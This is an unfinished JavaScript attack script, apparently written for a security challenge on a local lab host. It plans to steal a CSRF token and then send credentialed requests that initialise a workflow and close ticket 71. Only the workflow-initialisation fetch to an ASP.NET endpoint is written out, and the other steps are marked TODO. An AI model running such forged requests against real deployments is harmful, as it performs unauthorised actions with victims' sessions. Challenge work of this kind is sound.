/* The code is divided into 3 parts:
    1) Get the csrf token (TO DO)
    2) Initialize the Workflow (if we try directly to make the closing request we get an error (DONE)
        sErrorClass : 
            "EAccessViolation
            sMessage: "Access violation at address 00000000. Write from address 00000000")
    3) Execute the request to close the ticket (TODO)
*/

var site = "https://lduq-challenges-secu1.teexma.local";
var id=71;  // Put the right ID

var csrfToken;

/* Get the CSRF token */
// request to get the CSRF token and initialize the csrfToken var


var delayInMilliseconds = 500;
setTimeout(function() {
    // Code to be executed after 0.5 second
    // Request to initialize the Workflow
    fetch(site+"/code/TxASP/ajaxExecuteFunction.aspx", {
        "credentials": "include",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "RequestVerificationToken": csrfToken,
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin"
        },
        "referrer": "scriptDavidMassetti",
        "body": "request=%7B%22sDllFilePath%22%3A%22TxWorkflow%2FTxWorkflow.dll%22%2C%22sFunction%22%3A%22ListRelevantActions%22%2C%22idsObjectsToEvaluate%22%3A%5B%22"+id+"%22%5D%2C%22bListAllActions%22%3Atrue%2C%22sFlag%22%3A%22%22%2C%22sConfigurationTag%22%3A%22cfgWFTicket%22%7D",
        "method": "POST",
        "mode": "cors"
    });

    setTimeout(function() {
        // Code to be executed after 0.5 second
        // The request to close the ticket
        
    }, delayInMilliseconds);
}, delayInMilliseconds);
